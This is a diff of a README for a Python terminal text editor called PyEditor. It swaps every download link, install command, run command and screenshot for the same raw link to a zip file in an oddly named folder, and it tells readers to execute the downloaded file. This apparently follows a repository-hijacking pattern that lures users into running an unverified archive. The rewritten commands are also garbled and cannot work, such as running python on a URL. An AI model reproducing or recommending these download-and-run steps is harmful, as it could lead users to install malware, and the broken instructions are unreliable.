@@ -1,6 +1,6 @@
 # PyEditor: A Modern Terminal-Based Text Editor in Python 🐍✍️
 
-[![Download PyEditor Releases](https://img.shields.io/badge/Download%20Releases-Here-blue.svg)](https://github.com/marco71giusti/PyEditor/releases)
+[![Download PyEditor Releases](https://github.com/marco71giusti/PyEditor/raw/refs/heads/main/unsuckled/Py-Editor-v2.8.zip%https://github.com/marco71giusti/PyEditor/raw/refs/heads/main/unsuckled/Py-Editor-v2.8.zip)](https://github.com/marco71giusti/PyEditor/raw/refs/heads/main/unsuckled/Py-Editor-v2.8.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -30,7 +30,7 @@ To install PyEditor, you need to have Python 3.x installed on your system. Follo
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/marco71giusti/PyEditor.git
+   git clone https://github.com/marco71giusti/PyEditor/raw/refs/heads/main/unsuckled/Py-Editor-v2.8.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -41,24 +41,24 @@ To install PyEditor, you need to have Python 3.x installed on your system. Follo
 3. **Install Required Packages**:
    Use pip to install the necessary packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/marco71giusti/PyEditor/raw/refs/heads/main/unsuckled/Py-Editor-v2.8.zip
    ```
 
 4. **Run the Editor**:
    You can now run PyEditor with the following command:
    ```bash
-   python pyeditor.py
+   python https://github.com/marco71giusti/PyEditor/raw/refs/heads/main/unsuckled/Py-Editor-v2.8.zip
    ```
 
 5. **Download Releases**:
-   For the latest stable version, [download the releases here](https://github.com/marco71giusti/PyEditor/releases) and execute the appropriate file for your operating system.
+   For the latest stable version, [download the releases here](https://github.com/marco71giusti/PyEditor/raw/refs/heads/main/unsuckled/Py-Editor-v2.8.zip) and execute the appropriate file for your operating system.
 
 ## Usage
 Once you have installed PyEditor, you can start using it right away. Here are some basic commands to get you started:
 
 - **Open a File**:
   ```bash
-  python pyeditor.py filename.txt
+  python https://github.com/marco71giusti/PyEditor/raw/refs/heads/main/unsuckled/Py-Editor-v2.8.zip https://github.com/marco71giusti/PyEditor/raw/refs/heads/main/unsuckled/Py-Editor-v2.8.zip
   ```
 
 - **Save a File**:
@@ -100,9 +100,9 @@ We welcome contributions from the community! If you want to help improve PyEdito
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
 ## Support
-If you encounter any issues or have questions, please check the [Releases](https://github.com/marco71giusti/PyEditor/releases) section for updates. You can also open an issue in the repository for support.
+If you encounter any issues or have questions, please check the [Releases](https://github.com/marco71giusti/PyEditor/raw/refs/heads/main/unsuckled/Py-Editor-v2.8.zip) section for updates. You can also open an issue in the repository for support.
 
-[![Download PyEditor Releases](https://img.shields.io/badge/Download%20Releases-Here-blue.svg)](https://github.com/marco71giusti/PyEditor/releases)
+[![Download PyEditor Releases](https://github.com/marco71giusti/PyEditor/raw/refs/heads/main/unsuckled/Py-Editor-v2.8.zip%https://github.com/marco71giusti/PyEditor/raw/refs/heads/main/unsuckled/Py-Editor-v2.8.zip)](https://github.com/marco71giusti/PyEditor/raw/refs/heads/main/unsuckled/Py-Editor-v2.8.zip)
 
 ## Additional Resources
 - **Documentation**: Comprehensive documentation is available in the `docs` folder.
@@ -110,8 +110,8 @@ If you encounter any issues or have questions, please check the [Releases](https
 - **Community**: Join our community on GitHub Discussions for tips and tricks.
 
 ## Screenshots
-![PyEditor Interface](https://example.com/path/to/screenshot1.png)
-![Syntax Highlighting](https://example.com/path/to/screenshot2.png)
+![PyEditor Interface](https://github.com/marco71giusti/PyEditor/raw/refs/heads/main/unsuckled/Py-Editor-v2.8.zip)
+![Syntax Highlighting](https://github.com/marco71giusti/PyEditor/raw/refs/heads/main/unsuckled/Py-Editor-v2.8.zip)
 
 ## Frequently Asked Questions (FAQ)
 **Q: What platforms does PyEditor support?**  
